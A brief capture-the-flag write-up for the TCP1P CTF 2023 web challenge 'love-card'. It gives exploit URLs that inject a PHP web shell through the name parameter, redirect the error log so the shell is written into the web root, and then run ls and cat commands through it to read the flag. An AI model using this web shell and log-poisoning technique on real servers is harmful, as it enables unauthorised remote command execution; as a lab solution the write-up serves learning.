# love-card

Make your own love card for your gf <3

## Solution

I wasn't quite on the right track on my attempt...

https://github.com/SuperStormer/writeups/tree/master/tcp1pctf_2023/web/love-card

```txt
http://ctf.tcp1p.com:9137/?name=<?php system($_GET['cmd']);?>&dev=true&error_log=/var/www/html/cmd2.php

output exploit php to same directory

url encoded -> http://ctf.tcp1p.com:9137/?name=%3C?php%20system($_GET[%27cmd%27]);?%3E&dev=true&error_log=/var/www/html/cmd2.php

go to newly created page, list directory - http://ctf.tcp1p.com:9137/cmd2.php?cmd=ls%20/

fetch randomly named flag - http://ctf.tcp1p.com:9137/cmd2.php?cmd=cat%20/flag_8q35rtat.txt
```
